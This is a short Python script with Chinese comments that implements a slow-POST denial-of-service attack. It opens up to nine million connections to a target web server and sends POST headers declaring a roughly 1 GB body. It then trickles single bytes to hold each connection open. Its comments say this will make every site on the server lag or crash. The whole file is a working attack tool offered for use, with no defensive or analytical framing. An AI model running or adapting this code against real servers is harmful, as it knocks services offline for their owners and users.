#!/usr/bin/env python
import socket
import time
import threading

MAX = 9000000    # 最大socket链接量
PORT = 80             # 设置http或者https(443)网站端口
HOST = "192.168.92.163" #设置目标IP
PAGE = "/index.php"     #设置攻击页面(攻击该页面只是一个点，当攻击量达到了自然所有站点都会出现延迟或者崩溃)

#发送的包
buf = ("POST %s HTTP/1.1\r\n"
       "Host: %s\r\n"
       "Content-Length: 1000000000\r\n"    #字节数，100000000字节(b)=0.09G 这里发送大小是0.9G
       "Cookie: 1998\r\n"                  #Cookie可自行更改，或者设置任意值
       "\r\n" % (PAGE, HOST))

socks = []

# 关键函数，对目标网站发送包内数据
def conn_thread():
    global socks
    for i in range(0, MAX):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((HOST, PORT))
            s.send(buf.encode("utf-8"))
            print("Send buf OK!,conn=%d\n" % i)
            socks.append(s)
        except Exception as ex:    #异常捕捉,当目标无反应进行回显异常
            print("error:%s" % ex)
            time.sleep(0.1)

#检测发包是否成功，仅做检测，该函数不使用也不影响
def send_thread():
    global socks
    while True:
        for s in socks:
            try:
                s.send("f".encode("utf-8"))     #测试写入点可不设置
                print("Attack!!!")
            except Exception as ex:     #异常捕捉
                print("Send Exception:%s\n" % ex)
                socks.remove(s)
                s.close()
        time.sleep(0.1)

# 多线程执行两个函数
conn_th = threading.Thread(target=conn_thread, args=())     #启动线程，参数函数为连接发包函数
send_th = threading.Thread(target=send_thread, args=())     #启动线程，参数函数为检测是否发包成功


conn_th.start()
send_th.start()
